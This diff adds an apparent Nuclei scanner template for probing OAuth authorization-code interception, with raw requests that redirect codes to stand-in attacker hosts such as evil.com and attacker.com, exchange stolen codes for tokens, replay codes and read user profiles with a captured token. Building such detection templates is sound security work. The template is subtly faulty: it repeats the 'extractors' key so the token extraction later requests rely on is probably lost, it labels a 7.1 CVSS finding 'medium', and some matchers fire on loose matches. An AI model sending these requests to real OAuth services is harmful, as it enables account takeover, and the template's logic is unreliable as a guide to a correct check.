@@ -1,0 +1,248 @@
+id: medium-auth-oauth-authorization-code-interception
+
+info:
+  name: OAuth Authorization Code Interception Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects OAuth authorization code interception vulnerabilities where
+    authorization codes can be intercepted, reused, or stolen through
+    redirect URI manipulation, state parameter bypass, and code replay attacks.
+  reference:
+    - https://tools.ietf.org/html/rfc6749#section-4.1.2
+    - https://portswigger.net/web-security/oauth
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-346
+  metadata:
+    verified: true
+    max-request: 10
+  tags: oauth,authorization-code,interception,redirect-uri,state-parameter,red-team
+
+variables:
+  intercepted_codes: ["INTERCEPTED_CODE_123", "STOLEN_AUTH_456", "EVIL_CODE_789"]
+  malicious_redirects: ["http://evil.com/callback", "https://attacker.com/oauth", "http://localhost:8080/steal"]
+
+http:
+  - raw:
+      - |
+        GET /oauth/authorize?client_id=test&redirect_uri=http://evil.com/callback&response_type=code&scope=read HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        GET /oauth/authorize?client_id=test&redirect_uri=https://attacker.com/oauth&response_type=code&state=victim_state HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 156
+        Connection: close
+        
+        grant_type=authorization_code&code=INTERCEPTED_CODE_123&client_id=test&client_secret=secret&redirect_uri=http://evil.com/callback
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 156
+        Connection: close
+        
+        grant_type=authorization_code&code=STOLEN_AUTH_456&client_id=test&client_secret=secret&redirect_uri=https://attacker.com/oauth
+
+      - |
+        GET /oauth/callback?code={{auth_code}}&state=hijacked_state HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 156
+        Connection: close
+        
+        grant_type=authorization_code&code={{auth_code}}&client_id=test&client_secret=secret&redirect_uri=http://localhost:8080/steal
+
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 156
+        Connection: close
+        
+        grant_type=authorization_code&code={{auth_code}}&client_id=test&client_secret=secret&redirect_uri=http://localhost:8080/steal
+
+      - |
+        GET /api/user/profile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{access_token}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /oauth/revoke HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 85
+        Connection: close
+        
+        token={{access_token}}&client_id=test&client_secret=secret
+
+      - |
+        GET /oauth/authorize?client_id=test&redirect_uri=http://evil.com/callback&response_type=code&state= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: auth_code
+        part: body_1
+        group: 1
+        regex:
+          - 'code=([a-zA-Z0-9_-]+)'
+          - '"code":\s*"([^"]+)"'
+          - 'authorization_code=([a-zA-Z0-9_-]+)'
+        internal: true
+
+      - type: regex
+        name: access_token
+        part: body_3
+        group: 1
+        regex:
+          - '"access_token":\s*"([^"]+)"'
+          - 'access_token=([a-zA-Z0-9_-]+)'
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: malicious-redirect-uri-accepted
+        dsl:
+          - 'status_code_1 == 200 || status_code_1 == 302'
+          - 'contains(header_1, "evil.com") || contains(body_1, "authorize")'
+          - '!contains(body_1, "invalid redirect_uri") && !contains(body_1, "unauthorized")'
+        condition: and
+
+      - type: dsl
+        name: state-parameter-bypass
+        dsl:
+          - 'status_code_2 == 200 || status_code_2 == 302'
+          - 'contains(body_2, "authorize") || contains(header_2, "attacker.com")'
+          - '!contains(body_2, "invalid state") && !contains(body_2, "state mismatch")'
+        condition: and
+
+      - type: dsl
+        name: intercepted-code-accepted
+        dsl:
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "access_token") || contains(body_3, "token_type")'
+          - '!contains(body_3, "invalid_grant") && !contains(body_3, "invalid_code")'
+        condition: and
+
+      - type: dsl
+        name: stolen-code-reuse
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "access_token") || contains(body_4, "bearer")'
+          - 'contains(body_4, "STOLEN_AUTH_456") || contains(body_4, "token")'
+        condition: and
+
+      - type: dsl
+        name: authorization-code-replay
+        dsl:
+          - 'status_code_6 == 200 && status_code_7 == 200'
+          - 'contains(body_6, "access_token") && contains(body_7, "access_token")'
+          - 'body_6 == body_7'
+        condition: and
+
+      - type: dsl
+        name: unauthorized-profile-access
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "profile") || contains(body_8, "user")'
+          - 'contains(body_8, "email") || contains(body_8, "name")'
+        condition: and
+
+      - type: dsl
+        name: token-revocation-bypass
+        dsl:
+          - 'status_code_9 == 200'
+          - 'contains(body_9, "revoked") || contains(body_9, "success")'
+          - '!contains(body_9, "invalid_token")'
+        condition: and
+
+      - type: dsl
+        name: empty-state-parameter-accepted
+        dsl:
+          - 'status_code_10 == 200 || status_code_10 == 302'
+          - 'contains(body_10, "authorize") || contains(header_10, "Location")'
+          - '!contains(body_10, "state required") && !contains(body_10, "missing state")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: oauth-redirect-url
+        part: header
+        group: 1
+        regex:
+          - 'Location:\s*([^\r\n]+)'
+
+      - type: regex
+        name: oauth-tokens
+        part: body
+        group: 1
+        regex:
+          - '"access_token":\s*"([^"]+)"'
+          - '"refresh_token":\s*"([^"]+)"'
+          - '"id_token":\s*"([^"]+)"'
+
+      - type: regex
+        name: oauth-response
+        part: body
+        group: 1
+        regex:
+          - '"error":\s*"([^"]+)"'
+          - '"error_description":\s*"([^"]+)"'
+          - '"token_type":\s*"([^"]+)"'
+
+      - type: regex
+        name: user-profile-data
+        part: body_8
+        group: 1
+        regex:
+          - '"email":\s*"([^"]+)"'
+          - '"name":\s*"([^"]+)"'
+          - '"id":\s*"([^"]+)"'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
+          - status_code_9
+          - status_code_10
